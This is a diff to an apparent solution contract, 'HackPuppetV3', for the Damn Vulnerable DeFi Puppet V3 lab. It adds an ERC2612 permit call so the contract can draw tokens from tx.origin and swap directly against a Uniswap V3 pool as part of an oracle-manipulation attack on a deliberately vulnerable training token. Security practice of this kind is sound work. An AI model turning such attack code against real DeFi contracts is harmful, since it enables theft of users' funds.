@@ -10,8 +10,19 @@ interface IERC20 {
     function approve(address spender, uint256 amount) external returns (bool);
     function transfer(address to, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
+    function permit(
+        address owner,
+        address spender,
+        uint256 value,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external;
 }
 
+// I created this interface because DamnVulnerableToken uses pragma 0.8
+// And it's incompatible with the version =0.7.6 we're using 
 interface IWETH is IERC20 {
     function deposit() external payable;
     function withdraw(uint256 amount) external;
@@ -25,7 +36,27 @@ contract HackPuppetV3 is IUniswapV3SwapCallback {
         owner = msg.sender;
     }
 
-    function swap(address _pool, address _token, int256 amount, uint160 sqrt) public {
+    function swap(
+        address _pool,
+        address _token,
+        int256 amount,
+        uint160 sqrt,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) public {
+        // Using the permit function from ERC2612 to get the allowance needed for our transaction
+        IERC20(_token).permit(
+            tx.origin,
+            address(this),
+            uint256(amount),
+            deadline,
+            v,
+            r,
+            s
+        );
+
         // Passing encoded arguments so we don't need to write or read storage
         bytes memory encoded = abi.encode(_token, _pool);
         // Call directly the swap method of uniswapPool contract
